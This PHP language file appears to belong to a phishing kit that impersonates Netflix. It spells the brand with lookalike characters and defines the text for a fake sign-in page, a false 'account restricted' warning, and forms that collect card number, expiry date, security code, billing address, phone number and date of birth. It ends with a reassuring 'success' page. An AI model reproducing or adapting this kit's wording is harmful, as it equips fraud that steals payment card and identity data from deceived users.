<?php
// HF Jackson_Login_English
$Fartout = "NеtfIix";
$dokhol= "Sign In";
$mail= "Email";
$Password = "Password";
$nsit = "Forgot your email or password?";
$btona = "Sign In";
$box = 'Remember me.';
$saybok = "STEP";
$saybok1 = "OF";
$jdid ="New to NеtfIix?";
$tsajal = "Sign up now";
$tasl = "Questions? Contact us";
$chorot = "Gift Card Terms";
$bla = "Terms of Use";
$kho = "Privacy Statement";
$err ="Sorry, we can't find an account with this email address. Please try again or <a>create a new account.</a>";
$logha = "The process does not take more than 5 minutes.";
/*========[Page_3]==========*/
$title = "Update Your Account Information";
$wrn = "Your Account Has Been Restricted!";
$warn = "You Need To Update Your Account Information";
$wbtn = "Update Now";
/*========[Page_2]==========*/
$info  = "Payment Information";
$khoroj ="Sign Out";
$cnfrm = "Update Your Payment Information";
$goli ="Tell me more";
$cc = "Credit Card";
$nam = "Cardholder Name";
$namCC = "Exactly as Appears on Your Card";
$CCnum = "Card Number";
$dateCC = "Expiry Date";
$chhr= "Month";
$am= "Year";
$cvv = "Security Code";
$chno = "What is";
$btn = "Update Payment Method";
$src= "Gift Card Terms";
$so2al= "Questions?";
$cnt = "Contact us.";
$tem = "Terms of Use";
$prv= "Privacy Statement ";
$sn  = "Set up your credit or debit card";
$digits ="";
/*=======[Page_3]==========*/
$upld = "Update your Billing Information";
$pr = "Your Billing Address Must Match the Address Of Your Membership Plan Payment Method.<br>
We also Require your date of birth as additional Security Measures.";
$bling ="Billing Address";
$smiya ="Full Name";
$kniya ="Last Name";
$adrs1 ="Address 1";
$adrs2 ="Address 2";
$mdina ="City";
$zip ="Zip code";
$dola ="Country";
$namra ="Phone number";
$tarikh ="Date of Birth";
$eml ="E-mail";
$bton ="Update Billing Address";
/*=======[Page_4]==========*/
$scss ="Success";
$upd ="Your Account Has Been Updated";
$txt ="Thank You For Updating And Confirming Your Account Information.<br>
You May Now continue to login and use your account as normal without further interruptions.";
$final ="Continue To Login";
// HF Jackson_Login_English
?>